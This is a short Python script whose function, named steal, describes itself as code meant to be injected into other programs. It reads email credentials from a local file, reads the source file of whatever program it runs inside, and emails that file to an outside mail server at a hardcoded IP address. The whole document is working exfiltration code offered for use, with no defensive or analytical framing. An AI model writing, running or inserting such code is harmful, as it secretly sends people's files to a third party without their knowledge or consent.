import smtplib, ssl, os, inspect, sys
def steal():
    """
    A simple python script to steal what it has been injected
    into and email it to a given gmail address.
    """
    DATA_TO_INSERT = "GOTCHA!"

    # Didn't want to hard code my email and password, so I get it from a 
    # separate file.
    pat = "C:\\Users\\Public\\Documents\\virus_box_info.txt"
    f = open(pat)
    info = f.readlines()
    f.close()
    account = info[0]
    password = info[1]

    # Get the current frame's code
    target = inspect.currentframe().f_code.co_filename
    path = os.path.abspath("")
    f = open(target)
    message = f.read() + "\r\n"
    f.close()

    # ssl connect to the gmail SMTP server and send the message.
    context = ssl.create_default_context()

    with smtplib.SMTP_SSL("64.233.184.108:465") as server:
        server.login(account, password)
        server.sendmail(account, account, message)
